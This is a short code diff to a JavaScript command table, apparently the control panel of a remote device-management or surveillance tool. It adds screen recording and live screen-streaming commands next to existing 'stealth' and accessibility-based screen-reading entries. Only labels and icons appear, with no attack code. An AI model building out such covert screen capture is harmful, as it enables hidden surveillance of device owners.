@@ -195,8 +195,10 @@ const COMMANDS = {
     fully_show_app:            { category: 'stealth',     label: 'Show App (Full)',       icon: '🔓' },
     // Screen Reader (Accessibility)
     read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
-    screen_reader_start:       { category: 'screen_reader',label: 'Screen Reader Start',   icon: '▶️'  },
-    screen_reader_stop:        { category: 'screen_reader',label: 'Screen Reader Stop',    icon: '⏹'  },
+    screen_reader_start:         { category: 'screen_reader',label: 'Screen Reader Start (Rec)', icon: '▶️'  },
+    screen_reader_stop:          { category: 'screen_reader',label: 'Screen Reader Stop (Rec)',  icon: '⏹'  },
+    screen_reader_stream_start:  { category: 'screen_reader',label: 'Screen Reader Stream Start', icon: '📡' },
+    screen_reader_stream_stop:   { category: 'screen_reader',label: 'Screen Reader Stream Stop',  icon: '⏸' },
     find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
     get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
     get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
